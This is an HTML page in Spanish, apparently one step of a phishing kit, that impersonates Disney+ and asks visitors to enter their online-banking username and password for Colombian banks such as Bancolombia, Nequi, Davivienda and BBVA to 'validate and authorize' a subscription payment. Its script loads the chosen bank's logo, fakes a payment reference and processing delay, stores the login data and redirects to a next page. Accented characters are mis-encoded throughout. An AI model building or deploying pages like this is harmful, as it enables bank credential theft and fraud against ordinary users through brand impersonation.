<!DOCTYPE html>
<html lang="es">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Validaci칩n Bancaria | Disney+</title>

<link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600&display=swap" rel="stylesheet">

<style>
* {
    box-sizing: border-box;
}

body {
    margin: 0;
    background: #0f0f0f;
    font-family: 'Inter', sans-serif;
    color: #fff;
    min-height: 100vh;
    display: flex;
    flex-direction: column;
}

/* HEADER */
.header {
    padding: 18px 20px;
    display: flex;
    justify-content: space-between;
    align-items: center;
    background: #0f0f0f;
    border-bottom: 1px solid #222;
}

.header img {
    height: 30px;
}

.header a {
    color: #bbb;
    font-size: 14px;
    text-decoration: none;
}

.header a:hover {
    color: #fff;
}

/* CONTENIDO PRINCIPAL */
.container {
    max-width: 420px;
    margin: 40px auto;
    background: #1a1a1a;
    padding: 30px 25px;
    border-radius: 16px;
    box-shadow: 0 8px 30px rgba(0, 0, 0, 0.4);
    text-align: center;
    flex: 1;
}

/* LOGO DEL BANCO */
.bank-display {
    display: flex;
    align-items: center;
    justify-content: center;
    gap: 15px;
    margin-bottom: 25px;
    padding-bottom: 20px;
    border-bottom: 1px solid #333;
}

.bank-logo-container {
    width: 80px;
    height: 80px;
    background: rgba(255, 255, 255, 0.05);
    border-radius: 12px;
    display: flex;
    align-items: center;
    justify-content: center;
    padding: 15px;
    border: 1px solid rgba(255, 255, 255, 0.1);
}

.bank-logo {
    max-width: 100%;
    max-height: 100%;
    object-fit: contain;
}

.bank-info {
    text-align: left;
}

.bank-name {
    font-size: 22px;
    font-weight: 600;
    color: #00c8ff;
    margin-bottom: 5px;
}

.bank-message {
    font-size: 14px;
    color: #9ca3af;
}

/* FORMULARIO */
.form-group {
    margin: 20px 0;
    text-align: left;
}

label {
    display: block;
    margin: 0 0 8px 5px;
    font-size: 14px;
    color: #cccccc;
}

.input-with-icon {
    position: relative;
}

.input-icon {
    position: absolute;
    left: 15px;
    top: 50%;
    transform: translateY(-50%);
    color: #9ca3af;
    font-size: 18px;
}

input {
    width: 100%;
    padding: 15px 15px 15px 45px;
    background: #111;
    border: 1px solid #333;
    border-radius: 8px;
    color: #fff;
    font-size: 15px;
    transition: all 0.3s;
}

input:focus {
    outline: none;
    border-color: #00c8ff;
    box-shadow: 0 0 0 2px rgba(0, 200, 255, 0.2);
}

input::placeholder {
    color: #666;
}

/* BOT칍N */
button {
    width: 100%;
    padding: 16px;
    margin-top: 25px;
    background: linear-gradient(135deg, #00c8ff, #0099cc);
    color: #000;
    border: none;
    font-size: 17px;
    font-weight: 600;
    border-radius: 10px;
    cursor: pointer;
    transition: all 0.3s;
    letter-spacing: 0.5px;
}

button:hover {
    background: linear-gradient(135deg, #22dbff, #00aadd);
    transform: translateY(-2px);
    box-shadow: 0 5px 15px rgba(0, 200, 255, 0.3);
}

button:active {
    transform: translateY(0);
}

/* INFO ADICIONAL */
.payment-info {
    margin-top: 25px;
    padding: 15px;
    background: rgba(0, 200, 255, 0.05);
    border-radius: 8px;
    border: 1px solid rgba(0, 200, 255, 0.1);
}

.payment-info p {
    margin: 5px 0;
    font-size: 14px;
    color: #9ca3af;
}

.payment-info strong {
    color: #00c8ff;
}

/* FOOTER */
footer {
    margin-top: 40px;
    padding: 25px 20px;
    background: #0d0d0d;
    color: #7e7e7e;
    text-align: center;
    font-size: 13px;
    border-top: 1px solid #222;
}

footer a {
    color: #00c8ff;
    text-decoration: none;
    margin: 0 10px;
}

footer a:hover {
    text-decoration: underline;
}

/* RESPONSIVE */
@media (max-width: 480px) {
    .container {
        margin: 20px auto;
        padding: 25px 20px;
    }
    
    .bank-display {
        flex-direction: column;
        text-align: center;
    }
    
    .bank-info {
        text-align: center;
    }
    
    .bank-name {
        font-size: 20px;
    }
}
</style>
</head>

<body>

<!-- HEADER -->
<div class="header">
    <img src="https://upload.wikimedia.org/wikipedia/commons/3/3e/Disney%2B_logo.svg" alt="Disney+">
    <a href="paso3.html">Volver</a>
</div>

<!-- CONTENIDO -->
<div class="container">
    
    <!-- DISPLAY DIN츼MICO DEL BANCO -->
    <div class="bank-display">
        <div class="bank-logo-container">
            <img id="bankLogo" class="bank-logo" alt="Logo Banco">
        </div>
        <div class="bank-info">
            <div id="bankName" class="bank-name">Validaci칩n Bancaria</div>
            <div class="bank-message">Ingrese sus credenciales de acceso</div>
        </div>
    </div>

    <!-- FORMULARIO -->
    <div class="form-group">
        <label>Usuario / Documento</label>
        <div class="input-with-icon">
            <span class="input-icon">游녻</span>
            <input type="text" placeholder="Ej: usuario@banco.com" id="username">
        </div>
    </div>

    <div class="form-group">
        <label>Contrase침a</label>
        <div class="input-with-icon">
            <span class="input-icon">游</span>
            <input type="password" placeholder="Ingrese su contrase침a" id="password">
        </div>
    </div>

    <!-- INFO DEL PAGO -->
    <div class="payment-info">
        <p>Procesando pago de: <strong id="paymentAmount"></strong></p>
        <p>Servicio: <strong>Disney+</strong></p>
        <p>Referencia: <strong id="paymentRef"></strong></p>
    </div>

    <!-- BOT칍N -->
    <button onclick="procesar()">VALIDAR Y AUTORIZAR PAGO</button>

</div>

<!-- FOOTER -->
<footer>
    춸 2025 Disney+. Todos los derechos reservados. 췅 
    <a href="#">T칠rminos de uso</a> 췅 
    <a href="#">Pol칤tica de privacidad</a> 췅 
    <a href="#">Ayuda</a>
</footer>

<script>
// LISTA COMPLETA DE LOGOS DE BANCOS COLOMBIANOS
const bankLogos = {
    "Bancolombia": "https://upload.wikimedia.org/wikipedia/commons/thumb/5/5a/Logo_Bancolombia.png/800px-Logo_Bancolombia.png",
    "Nequi": "https://upload.wikimedia.org/wikipedia/commons/thumb/8/89/Nequi_logo_2021.png/800px-Nequi_logo_2021.png",
    "Davivienda": "https://upload.wikimedia.org/wikipedia/commons/thumb/5/54/Logo-davivienda.png/800px-Logo-davivienda.png",
    "BBVA": "https://upload.wikimedia.org/wikipedia/commons/thumb/8/8b/BBVA_Logo.svg/800px-BBVA_Logo.svg.png",
    "Banco Popular": "https://upload.wikimedia.org/wikipedia/commons/thumb/8/8e/Banco_Popular_logo.png/800px-Banco_Popular_logo.png",
    "Banco de Bogot치": "https://upload.wikimedia.org/wikipedia/commons/thumb/8/89/Banco_de_Bogota_logo.svg/800px-Banco_de_Bogota_logo.svg.png",
    "Ita칰": "https://upload.wikimedia.org/wikipedia/commons/thumb/0/0a/Itau_logo.png/800px-Itau_logo.png"
};

// TEXTO DESCRIPTIVO DE CADA BANCO
const bankDescriptions = {
    "Bancolombia": "Acceda con su usuario Bancolombia a la persona",
    "Nequi": "Ingrese su n칰mero de tel칠fono y PIN de Nequi",
    "Davivienda": "Usuario Davivienda M칩vil o DaviPlata",
    "BBVA": "Credenciales de BBVA M칩vil o Banca Online",
    "Banco Popular": "Usuario Banco Popular Personas",
    "Banco de Bogot치": "Acceso Banco de Bogot치 Digital",
    "Ita칰": "Credenciales Ita칰 Personas o Ita칰 M칩vil"
};

// RECUPERAR DATOS DEL PAGO
const selectedBank = localStorage.getItem("selectedBank") || "";
const paymentData = JSON.parse(localStorage.getItem("paymentData") || "{}");

// ELEMENTOS DEL DOM
const bankLogoElement = document.getElementById("bankLogo");
const bankNameElement = document.getElementById("bankName");
const bankMessageElement = document.querySelector(".bank-message");
const paymentAmountElement = document.getElementById("paymentAmount");
const paymentRefElement = document.getElementById("paymentRef");

// FUNCI칍N PARA CONFIGURAR LA P츼GINA
function setupPage() {
    // Configurar banco
    if (selectedBank && bankLogos[selectedBank]) {
        bankLogoElement.src = bankLogos[selectedBank];
        bankLogoElement.alt = `Logo ${selectedBank}`;
        bankNameElement.textContent = selectedBank;
        
        if (bankDescriptions[selectedBank]) {
            bankMessageElement.textContent = bankDescriptions[selectedBank];
        }
    } else {
        // Si no hay banco seleccionado, mostrar mensaje
        bankLogoElement.src = "data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24' fill='%2300c8ff'%3E%3Cpath d='M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 15l-5-5 1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z'/%3E%3C/svg%3E";
        bankLogoElement.alt = "Banco no seleccionado";
        bankNameElement.textContent = "Banco no seleccionado";
        bankMessageElement.textContent = "Por favor, regrese y seleccione un banco";
        bankMessageElement.style.color = "#ff5555";
    }
    
    // Configurar informaci칩n del pago
    if (paymentData.amount) {
        paymentAmountElement.textContent = paymentData.amount;
    } else {
        paymentAmountElement.textContent = "COP 24.900/mes";
    }
    
    // Generar referencia 칰nica
    const refNumber = Math.floor(Math.random() * 1000000000).toString().padStart(9, '0');
    paymentRefElement.textContent = `DISNEY-${refNumber}`;
    
    // Guardar referencia para usar despu칠s
    localStorage.setItem("paymentReference", refNumber);
}

// FUNCI칍N PARA PROCESAR EL PAGO
function procesar() {
    const username = document.getElementById("username").value.trim();
    const password = document.getElementById("password").value.trim();
    
    // Validaci칩n b치sica
    if (!username || !password) {
        alert("Por favor, ingrese su usuario y contrase침a.");
        return;
    }
    
    if (!selectedBank) {
        alert("Error: No se ha seleccionado un banco. Regrese al paso anterior.");
        return;
    }
    
    // Mostrar mensaje de procesamiento
    const btn = document.querySelector("button");
    const originalText = btn.textContent;
    btn.textContent = "PROCESANDO...";
    btn.disabled = true;
    
    // Simular procesamiento
    setTimeout(() => {
        // Guardar datos de autenticaci칩n (en un caso real esto ir칤a al servidor)
        const authData = {
            bank: selectedBank,
            username: username,
            timestamp: new Date().toISOString(),
            reference: localStorage.getItem("paymentReference"),
            plan: paymentData.plan || "standard_ads"
        };
        
        localStorage.setItem("bankAuthData", JSON.stringify(authData));
        
        // Redirigir a p치gina de 칠xito/procesando
        window.location.href = "procesando.html";
    }, 1500);
}

// Inicializar p치gina cuando se carga
document.addEventListener('DOMContentLoaded', setupPage);

// Manejar Enter para enviar formulario
document.addEventListener('keypress', function(e) {
    if (e.key === 'Enter') {
        procesar();
    }
});
</script>

</body>
</html>
